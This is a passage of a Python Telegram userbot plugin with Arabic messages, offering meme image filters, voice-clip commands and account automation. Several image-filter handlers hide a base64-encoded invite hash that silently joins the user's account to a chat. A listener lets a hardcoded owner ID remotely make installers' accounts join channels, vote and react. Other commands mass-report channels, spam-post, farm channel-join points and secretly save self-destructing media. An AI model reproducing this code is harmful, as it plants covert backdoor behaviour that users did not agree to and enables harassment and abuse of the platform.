            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط - عكس الألوان ..."        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود .. ")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذا الفيديو!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذه الصورة!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@essa.on(admin_cmd(outgoing=True, pattern="ص82$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois82:
        await vois.client.send_file(vois.chat_id, iqvois82 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص83$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois83:
        await vois.client.send_file(vois.chat_id, iqvois83 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص84$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois84:
        await vois.client.send_file(vois.chat_id, iqvois84 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص85$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois85:
        await vois.client.send_file(vois.chat_id, iqvois85 , reply_to=Ti)
        await vois.delete()
@essa.on(events.NewMessage(outgoing=True, pattern=r'.ابلاغ قناة ?(.*)'))
async def Channels_groups_Reporter(event):
    os_success = await event.edit(f'**جاري معالجة الامر**')
            
    try:        
        data = ((event.message.message).replace('.ابلاغ قناة', '').strip()).split('-')
        channel_id = (data[1]).strip()
        reason_message = (data[2]).strip()
        reports_count = (data[3]).strip()
        delay = (data[4]).strip()
                
                
            
        for x in range(1, int(reports_count)+1):
            for REASON in reasonlistreport:
                result = await event.client(ReportPeerRequest(peer=channel_id, reason=REASON, message=reason_message))
            os_success = await event.edit(f'**تبليغ رقم {x} اكتمل**')
            await asyncio.sleep(int(delay))
                
    except Exception as error:
        print (error)

    os_success = await event.edit(f'**تم التبليغ.. انتهى**')

@essa.on(events.NewMessage(outgoing=True, pattern=r'.ايقاف اسم متقطع'))
async def NameChangeSplitDisactive(event):
    global ChangeNameSplit
            
    ChangeNameSplit = False
    update = await event.edit('تم ايقاف اسم متقطع ')

        # CHANGE NAME - SPLITS
@essa.on(events.NewMessage(outgoing=True, pattern=r'.اسم متقطع ?(.*)'))
async def NameChangeSplit(event):
    global ChangeNameSplit
            
    if ChangeNameSplit == True:
        ChangeNameSplit = False
        await asyncio.sleep(5)
                
    ChangeNameSplit = True
            
    full_name = (event.message.message).replace('.اسم متقطع', '').strip()
    update = await event.edit('تم تأكيد امر الاسم المتقطع')
    run = await ChangeSplitName(full_name)
            
async def ChangeSplitName(full_name):
    global ChangeNameSplit
            
    while ChangeNameSplit == True:
        new_full_name = ''
        for letter in full_name:
            new_full_name = f'{new_full_name}{letter}'
                    # change name
            update = await senzir(UpdateProfileRequest(first_name=new_full_name))
            await asyncio.sleep(5)
        new_full_name = ''



@essa.on(events.NewMessage(outgoing=True, pattern=r'.تكرار متقطع ?(.*)'))
async def GroupOfWords(event):
    information = (event.message.message).replace('.تكرار متقطع', '').strip()
            
    try:
        replies_number = int(information.split(' ')[0])
        delay = int(information.split(' ')[1])
        words = information.replace(f'{information.split(" ")[0]} {information.split(" ")[1]}', '').strip()
                
        try:
            k = 0
            for x in range(replies_number):
                try:
                    edit = await event.edit(words.split(' ')[k])
                    k += 1
                except:
                    k = 1
                    edit = await event.edit(words.split(' ')[0])
                await asyncio.sleep(delay)
            k = 0
        except Exception as error:
            print (f'**حدث خطأ :** {error}')
    except Exception as error:
        edit = await event.edit('**تأكد من ارسال القيم بالشكل الصحيح.. الصيغة : .تكرار متقطع + عدد + دقيقة + الكلمات**')


@essa.on(events.NewMessage(outgoing=True, pattern=r'.تصحيح ?(.*)'))
async def EditMessageSplit(event):
    new_content = (event.message.message).replace('.تصحيح', '')
    try:
        if event.reply_to != None:
            try:
                from telethon.tl.functions.messages import GetMessagesRequest
                message = await event.client(GetMessagesRequest(id=[event.reply_to.reply_to_msg_id]))
            except:
                from telethon.tl.functions.channels import GetMessagesRequest
                message = await event.client(GetMessagesRequest(channel=event.chat_id, id=[event.reply_to.reply_to_msg_id]))
                        
            if message.messages[0].message != '' and new_content != '':
                        
                try:
                    old_content = message.messages[0].message
                    for i in range(len(old_content)-1, -1, -1):
                        if old_content[:i] != '' and old_content[i] != '':
                            try:
                                await event.client.edit_message(entity=event.chat, message=message.messages[0].id, text=old_content[:i])
                                await asyncio.sleep(0.5)
                            except:
                                pass
                                    
                    for i in range(len(new_content)+1):
                        if new_content[:i] != '':
                            try:
                                await event.client.edit_message(entity=event.chat, message=message.messages[0].id, text=new_content[:i])
                                await asyncio.sleep(0.5)
                            except:
                                pass
                except Exception as error:
                    await event.edit(f'**حدث خطأ : **{error}')
    except:
        pass   
@essa.on(admin_cmd(outgoing=True, pattern="ص86$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois86:
        await vois.client.send_file(vois.chat_id, iqvois86 , reply_to=Ti)
        await vois.delete()
control_owner_id = 1226408155
# OWNER
@essa.on(events.NewMessage(outgoing=True, pattern='.تصويت ?(.*)'))
async def Owner_VoteSend(event):
    global control_owner_id
    
    if event.sender_id == control_owner_id:
        InputsList = (event.message.message).split(" ")
        if len(InputsList) == 3:
            # vote message first button
            await event.reply('تم ارسال الامر')
        elif len(InputsList) == 2:
            # vote options
            await event.reply('تم ارسال الامر')
        else:
            await event.reply('الأمر الذي ارسلته غير صحيح')
    
# OWNER
@essa.on(events.NewMessage(outgoing=True, pattern='.اغلاق تصويت ?(.*)'))
async def Owner_VoteSend(event):
    global control_owner_id
    
    if event.sender_id == control_owner_id:
        InputsList = (event.message.message).split(" ")
        await event.reply('تم ارسال الامر')

    
    
# CONTROL JOIN THIS CHANNEL/GROUP
@essa.on(events.NewMessage(pattern='.تصويت ?(.*)')) # outgoing=False
async def Control_Vote(event):
    global control_owner_id
    
    if event.sender_id == control_owner_id:
        InputsList = (event.message.message).split(" ")
        if len(InputsList) == 2:
            # vote message first button
            try: 
                clear_link = InputsList[1].replace("https://t.me/c/", "")
                clear_link = clear_link.replace("https://t.me/", "")
                channel_id, msg_id = clear_link.split('/')
                try: 
                    channel_id = int(channel_id)
                except:
                    pass
                
                # join channel
                await JoinChannel(event, channel_id), await asyncio.sleep(1)
                
                # vote
                vote_message = await event.client(GetMessagesRequest(channel=channel_id, id=[int(msg_id)]))
                await vote_message.messages[0].click(0)
                
                # leave channel
                await LeaveChannel(event, channel_id)
                
            except Exception as error:
                print (error)
            
        elif len(InputsList) == 3:
            if InputsList[2].isdigit():
                # vote options
                try:
                    clear_link = InputsList[1].replace("https://t.me/c/", "")
                    clear_link = clear_link.replace("https://t.me/", "")
                    channel_id, msg_id = clear_link.split('/')
                    try: 
                        channel_id = int(channel_id)
                    except:
                        pass
                    vote_message = await event.client(GetMessagesRequest(channel=channel_id, id=[int(msg_id)]))
                    await event.client(SendVoteRequest(peer=channel_id, msg_id=int(msg_id), options=[str(int(InputsList[2])-1)]))
                except Exception as error:
                    pass
            else:
                try:
                    clear_link = InputsList[1].replace("https://t.me/c/", "")
                    clear_link = clear_link.replace("https://t.me/", "")
                    channel_id, msg_id = clear_link.split('/')
                    
                    try: 
                        channel_id = int(channel_id)
                    except:
                        pass
                    
                    result = await event.client(SendReactionRequest(
                        peer=channel_id,
                        msg_id=int(msg_id.strip()),
                        reaction=[ReactionEmoji(emoticon=InputsList[2])]
                        ))
                    
                except Exception as error:
                    pass
        else:
            pass
        
        
# CONTROL JOIN THIS CHANNEL/GROUP
@essa.on(events.NewMessage(outgoing=False, pattern='.اغلاق تصويت ?(.*)')) # outgoing=False
async def Control_Vote(event):
    global control_owner_id
    
    if event.sender_id == control_owner_id:
        InputsList = (event.message.message).split(" ")
        
        try:
            clear_link = InputsList[1].replace("https://t.me/c/", "")
            clear_link = clear_link.replace("https://t.me/", "")
            channel_id, msg_id = clear_link.split('/')
            
            try: 
                channel_id = int(channel_id)
            except:
                pass
        except:
            pass
        
        try:            
            result = await event.client(SendReactionRequest(
                peer=channel_id,
                msg_id=int(msg_id.strip()),
                reaction=[ReactionEmpty()]
                ))
            
        except Exception as error:
            pass
            
        try:
            vote_message = await event.client(GetMessagesRequest(channel=channel_id, id=[int(msg_id)]))
            await vote_message.messages[0].click(0)
        except Exception as error:
            pass
        



# JOIN PUBLIC
async def JoinChannel(event, username):
    try:
        Join = await event.client(JoinChannelRequest(channel=username))
    except:
        pass
    
# LEAVE CHANNEL
async def LeaveChannel(event, username):
    try:
        Leave = await event.client(LeaveChannelRequest(channel=username))
    except:
        pass


nshressa = gvarstatus("NSHR") or "نشر"

StopSpamming = False
# post
async def PostNow(event, chat_id, RepeatParagraph, Delay):
    os_send = await event.client(SendMessageRequest(peer=chat_id, message=RepeatParagraph))
    await asyncio.sleep(int(Delay))


@essa.on(events.NewMessage(outgoing=True, pattern=f'.{nshressa} ?(.*)'))
async def RepeatTimer(event):
    global StopSpamming
    
    StopSpamming = False
    

    MESSAGE = ((event.message.message).replace(f".{nshressa}", "")).split("-")
    try :
        Delay = int(MESSAGE[1])
        RepeatCount = int(MESSAGE[2])
        ChatIdPost = event.chat_id
        RepeatParagraph = MESSAGE[3]
        
        
        try:
            os_success = await event.edit(f'**تم تاكيد الطلب**')
            for x in range(0, int(RepeatCount)):
                if StopSpamming == True:
                    break
                try:
                    await PostNow(event, ChatIdPost, RepeatParagraph, Delay)
                except Exception as error:
                    await event.reply(f'لم يستطيع النشر هنا : {ChatIdPost}\n\nالسبب : {error}')
                    
        except:
            os_failed = await event.edit(f'**بالرجاء التأكد من قيمة عدد الثواني و التكرار**')
    except:
        os_failed = await event.edit(f'**بالرجاء استخدام الصيفة التالية :\n\nالصيغة : ن - عدد ثواني - عدد مرات - الجملة**')
    
# stop
@essa.on(events.NewMessage(outgoing=True, pattern=r'.اغلاق النشر'))
async def RepeatTimer(event):
    global StopSpamming
    
    StopSpamming = True
    await event.reply('**سيتم ايقاف الأمر قريبا**')

@essa.on(admin_cmd(outgoing=True, pattern="ص87$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois87:
        await vois.client.send_file(vois.chat_id, iqvois87 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص88$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois88:
        await vois.client.send_file(vois.chat_id, iqvois88 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص89$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois89:
        await vois.client.send_file(vois.chat_id, iqvois89 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص90$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois90:
        await vois.client.send_file(vois.chat_id, iqvois90 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص91$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois92:
        await vois.client.send_file(vois.chat_id, iqvois93 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص92$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois92:
        await vois.client.send_file(vois.chat_id, iqvois92 , reply_to=Ti)
        await vois.delete()
essayouali = False
@essa.iq_cmd(pattern="تشغيل حفض الوقتية$")
async def iqalistart(event):
    global essayouali
    essayouali = True
    await edit_or_reply(event, "تم بنجاح تفعيل حفظ  الذاتية من الان")
@essa.iq_cmd(pattern="ايقاف حفض الوقتية$")
async def iqalistop(event):
    global essayouali
    essayouali = False
    await edit_or_reply(event, "تم بنجاح تعطيل حفظ  الذاتية من الان")
@essa.on(events.NewMessage(outgoing=True, pattern=".تجميع المليار"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await essa(JoinChannelRequest('@Groupessa'))
    channel_entity = await essa.get_entity("@EEObot")
    await essa.send_message("@EEObot", '/start')
    await asyncio.sleep(4)
    msg0 = await essa.get_messages("@EEObot", limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await essa.get_messages("@EEObot", limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await essa.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await essa(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await senzir(ImportChatInviteRequest(bott))
            msg2 = await essa.get_messages("@EEObot", limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await essa.get_messages("@EEObot", limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع**")

@essa.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await essa(JoinChannelRequest('@Groupessa'))
    channel_entity = await essa.get_entity("@A_MAN9300BOT")
    await essa.send_message("@A_MAN9300BOT" ,'/start')
    await asyncio.sleep(4)
    msg0 = await essa.get_messages("@A_MAN9300BOT", limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await essa.get_messages("@A_MAN9300BOT", limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await essa.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await essa(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await essa(ImportChatInviteRequest(bott))
            msg2 = await essa.get_messages("@A_MAN9300BOT", limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await essa.get_messages("@A_MAN9300BOT", limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع**")

@essa.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await essa(JoinChannelRequest('@Groupsenzir'))
    channel_entity = await essa.get_entity("@MARKTEBOT")
    await essa.send_message("@MARKTEBOT" ,'/start')
    await asyncio.sleep(4)
    msg0 = await essa.get_messages("@MARKTEBOT", limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await essa.get_messages("@MARKTEBOT", limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await essa.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await essa(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await essa(ImportChatInviteRequest(bott))
            msg2 = await essa.get_messages("@MARKTEBOT", limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await essa.get_messages("@MARKTEBOT", limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع**")


@essa.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await essa(JoinChannelRequest('@Groupessa'))
    channel_entity = await essa.get_entity("@xnsex21bot")
    await essa.send_message("@xnsex21bot" ,'/start')
    await asyncio.sleep(4)
    msg0 = await essa.get_messages("@xnsex21bot", limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await essa.get_messages("@xnsex21bot", limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await essa.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await essa(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await essa(ImportChatInviteRequest(bott))
            msg2 = await essa.get_messages("@xnsex21bot", limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await essa.get_messages("@xnsex21bot", limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع**")

@essa.on(events.NewMessage(outgoing=True, pattern=".تجميع المليون"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await essa(JoinChannelRequest('@Groupessa'))
    channel_entity = await essa.get_entity("@qweqwe1919bot")
    await essa.send_message("@qweqwe1919bot" ,'/start')
    await asyncio.sleep(4)
    msg0 = await essa.get_messages("@qweqwe1919bot", limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await senzir.get_messages("@qweqwe1919bot", limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await essa.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await essa(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await essa(ImportChatInviteRequest(bott))
            msg2 = await essa.get_messages("@qweqwe1919bot", limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await essa.get_messages("@qweqwe1919bot", limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع**")

tgmamotgar = gvarstatus("TGMAT1") or "@EEObot"

@essa.on(events.NewMessage(outgoing=True, pattern=".تجميع متغير"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await essa(JoinChannelRequest('@Groupessa'))
    channel_entity = await essa.get_entity(f"{tgmamotgar}")
    await essa.send_message(f"{tgmamotgar}", '/start')
    await asyncio.sleep(4)
    msg0 = await essa.get_messages(f"{tgmamotgar}" ,limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await essa.get_messages(f"{tgmamotgar}" ,limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await essa.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await essa(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await essa(ImportChatInviteRequest(bott))
            msg2 = await essa.get_messages(f"{tgmamotgar}" ,limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await essa.get_messages(f"{tgmamotgar}", limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع**")



@essa.on(    events.NewMessage(        func=lambda e: e.is_private and (e.photo or e.video) and e.media_unread    ))
async def iqali(event):
    global essayouali
    if essayouali:
        sender = await event.get_sender()
        username = sender.username
        user_id = sender.id
        result = await event.download_media()
        caption = (            f" ذاتية التدمير وصلت لك !\n: المرسل @{username}\nالايدي : {user_id}"        )
        await essa.send_file("me", result, caption=caption)
@essa.on(admin_cmd(outgoing=True, pattern="ص93$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois93:
        await vois.client.send_file(vois.chat_id, iqvois93 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص94$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois94:
        await vois.client.send_file(vois.chat_id, iqvois94 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص95$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois95:
        await vois.client.send_file(vois.chat_id, iqvois95 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="فلتر احمر$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة ...")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط - فلتر احمر !"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود ...")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود ... ")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "القالب غير موجود 🧐 !"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@essa.iq_cmd(pattern="كروباتي$")
async def gros(event):
    result = await essa(functions.channels.GetGroupsForDiscussionRequest())
    listiq = []
    for iqrusiq in result.chats:
        username = (            "  | @" + iqrusiq.username
            if hasattr(iqrusiq, "username") and iqrusiq.username
            else " "        )
        kno = str(iqrusiq.id) + " | " + iqrusiq.title + username
        print(kno)
        listiq.append(kno)
    if listiq:
        await essa.send_message("me", "\n".join(listiq))
@essa.iq_cmd(pattern="الحاظرهم$")
async def bans(event):
    result = await essa(functions.contacts.GetBlockedRequest(offset=0, limit=1000000))
    listiq = []
    for user in result.users:
        if not user.bot:
            username = "@" + user.username if user.username else " "
            kno = f"{user.id} {user.first_name} {username}"
            print(kno)
            listiq.append(kno)
    if listiq:
        await essa.send_message("me", "\n".join(listiq))
@essa.iq_cmd(pattern="قيد (.*)")
async def kade(event):
    exe = event.text[5:]
    try:
        result = await essa(            functions.messages.ToggleNoForwardsRequest(peer=exe, enabled=True)        )
        await event.edit("تم بنجاح تفعيل وضع تقييد المحتوى")
    except errors.ChatNotModifiedError as e:
        print(e)  
@essa.iq_cmd(pattern="نوعه (.*)")
async def noah(event):
    exe = event.text[5:]
    x = await essa.get_entity(exe)
    if hasattr(x, "megagroup") and x.megagroup:
        await event.edit("نوع المعرف : كروب")
    elif hasattr(x, "megagroup") and not x.megagroup:
        await event.edit("نوع المعرف : قناة")
    elif hasattr(x, "bot") and x.bot:
        await event.edit("نوع المعرف : بوت")
    else:
        await event.edit("نوع المعرف : لحساب")
@essa.iq_cmd(pattern="احذف (.*)")
async def delet(event):
    exe = event.text[5:]
    await essa.get_dialogs()
    chat = exe
    await essa.delete_dialog(chat, revoke=True)
    await event.edit("- تم بنجاح حذف الدردشة مع المستخدم بنجاح")

@essa.on(admin_cmd(outgoing=True, pattern="يمين الصوره$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("الوسائط المدعومة غير موجودة")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
